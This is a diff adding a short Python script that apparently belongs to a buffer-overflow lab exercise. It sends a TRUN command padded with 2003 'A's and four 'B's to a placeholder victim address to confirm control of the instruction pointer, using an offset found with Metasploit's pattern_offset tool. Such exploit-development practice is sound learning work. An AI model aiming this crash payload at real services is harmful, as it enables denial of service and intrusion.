@@ -1,0 +1,17 @@
+#!/usr/bin/python
+import os  
+import socket
+# 2003 from command /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337                                                                          
+buff = "A" * 2003 + "B" * 4
+victimIp = 'xxx.xxx.xxx.xxx'       # Enter Victim's IP Address 
+victimPort = xxxx                  # Enter Victim's Port
+                                   # Create the socket
+try:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((victimIp,victimPort))
+    print(s.recv(1024))
+    s.send('TRUN /.:/'+buff)
+    print(str(s.recv(1024)))
+    s.close()
+except:
+    print "Error in connection"
